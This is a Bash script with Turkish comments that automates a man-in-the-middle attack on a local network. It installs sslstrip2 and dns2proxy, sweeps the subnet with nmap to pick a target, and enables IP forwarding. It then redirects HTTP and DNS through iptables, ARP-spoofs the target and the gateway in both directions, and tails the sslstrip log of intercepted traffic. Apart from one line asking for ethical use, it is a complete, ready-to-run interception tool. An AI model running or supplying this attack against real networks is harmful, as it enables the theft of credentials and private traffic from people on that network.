#!/bin/bash

#cikis islemi

trap ctrl_c INT
ctrl_c() {
clear
echo -e "\033[33m[*] (Ctrl + C ) Cikilacak ..."
echo ""
echo -e "[*] Lutfen bekleyiniz  ..."
echo ""
killall xterm &
echo -e "[*] Ip tablolari temizleniyor"
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
echo ""
echo -e "[*] Kodu kullandiginiz icin tesekkurler!\033[0m"
exit
}

#ilgili araclar mevcut mu
echo -e "[*] Hosgeldiniz, bu kodu sadece etik amaclar icin kullanmalisiniz!\033[0m"
filehsts=/root/hsts
if [ -d "$filehsts" ]
then
       	echo -e "\033[32m[+] HSTS klasoru mevcut\033[0m"
else
	echo -e "\033[33m[-] HSTS klasoru mevcut degil\033[0m"	
	echo -e "\033[32m[+] HSTS klasoru olusturuluyor\033[0m"
	mkdir $filehsts
fi

filedns2proxy=/root/hsts/dns2proxy
if [ -d "$filedns2proxy" ]
then
	echo -e "\033[32m[+] dns2proxy mevcut\033[0m"
else
	echo -e "\033[33m[-] dns2proxy mevcut degil\033[0m"
	cd /root/hsts/
	git clone https://github.com/LeonardoNve/dns2proxy.git &
	pip install dnspython &
fi

filesslstrip2=/root/hsts/sslstrip2
if [ -d "$filesslstrip2" ]
then 
	echo -e "\033[32m[+] sslstrip2 mevcut\033[0m"
else 
	echo -e "\033[33m[-] sslstrip2 mevcut degil\033[0m"
	cd /root/hsts/
	git clone https://github.com/byt3bl33d3r/sslstrip2.git
	cd sslstrip2	
	mv README.md README
	python setup.py install
	clear
fi

echo -e ""
echo -e ""

#nmap scan
echo -e "Hangi arayuz kullanilsin ( eth0, wlan0, wlan1...): "
echo -e ""
read interface
echo -e ""
gateway=$(route -n | tail -n2 | head -n1 | awk '{print $2}')
echo -e "\033[32m[+] nmap calisiyor\033[0m"
nmap $gateway/24 -n -sP
echo -e ""
echo -e "Hedefler listelendi, lutfen bekleyin "
echo -e "\033[31m"
nmap $gateway/24 -n -sP | grep '192.168' | awk '{print $5}'
echo -e "\033[0m"
echo -e "Hedef IP sec:"
echo -e ""
read targetip
echo -e ""

#saldiri
echo "1" > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
cd /root/hsts/dns2proxy/
xterm -title "dns2proxy" -bg "#000000" -fg "#1ec503" -geometry 109x20-0-0 -e python dns2proxy.py &
cd /root/hsts/sslstrip2
xterm -title "sslstrip" -bg "#000000" -fg "#1ec503" -geometry 109x20-0-0 -e python sslstrip.py -l 8080 &
xterm -title "arpspoof1" -bg "#000000" -fg "#1ec503" -geometry 109x20-0-0 -e arpspoof -i $interface -t $gateway $targetip &
xterm -title "arpspoof2" -bg "#000000" -fg "#1ec503" -geometry 109x20-0-0 -e arpspoof -i $interface -t $targetip $gateway &
clear
echo -e ""
echo -e ""
echo -e ""
echo -e "\033[36mLoglar buraya gelecek!"
echo -e "Ctrl+C yapip cikabilirsiniz.\033[0m"
echo -e ""
tail -f sslstrip.log
